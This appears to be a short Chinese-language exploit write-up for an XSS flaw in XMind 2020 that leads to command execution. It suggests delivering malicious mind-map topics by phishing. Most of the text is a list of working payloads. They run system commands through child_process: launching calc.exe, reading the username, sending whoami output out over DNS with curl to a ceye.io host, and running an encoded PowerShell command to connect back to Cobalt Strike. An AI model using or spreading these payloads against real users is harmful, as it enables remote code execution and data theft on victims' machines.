# XMind 2020 存在XSS导致命令执行漏洞
> XMind 2020存在XSS漏洞，攻击者在大纲模块下，可在主题中插入恶意代码，当用户按下键盘上的功能键时（例如shift、command、enter、control、ctrl等），即可触发漏洞。实战中，攻击者可通过钓鱼的方式，利用该XSS漏洞实现命令执行，例如可DNS带外传输主机信息或直接上线到CS/MSF等。
## 部分payload
* 简单弹窗<br>`<img src=1 onerror=alert("1")>`<br>
* 弹计算器<br>`<img src=# onerror="require('child_process').exec('calc.exe',null);">`<br>
* 弹用户名<br>`<img src=x onerror="const exec = require('child_process').exec;exec('whoami').stdout.on('data', function (data) {alert(data);})">`
![image](https://user-images.githubusercontent.com/53027649/124340974-c5f69080-dbeb-11eb-990c-078a7cba2543.png)
* DNS带外<br>``<img src=x onerror="const exec = require('child_process').exec;exec('curl `whoami`.domain.ceye.io').stdout.on('data', function (data) {alert(data);})">``<br>
![image](https://user-images.githubusercontent.com/53027649/124340984-d0b12580-dbeb-11eb-8e4c-990e508c66ca.png)
* 通过对powershell进行编码，然后替换payload上线CS<br>`<img src=x onerror="const exec = require('child_process').exec;exec('powershell（……）').stdout.on('data', function (data) {alert(data);})">`
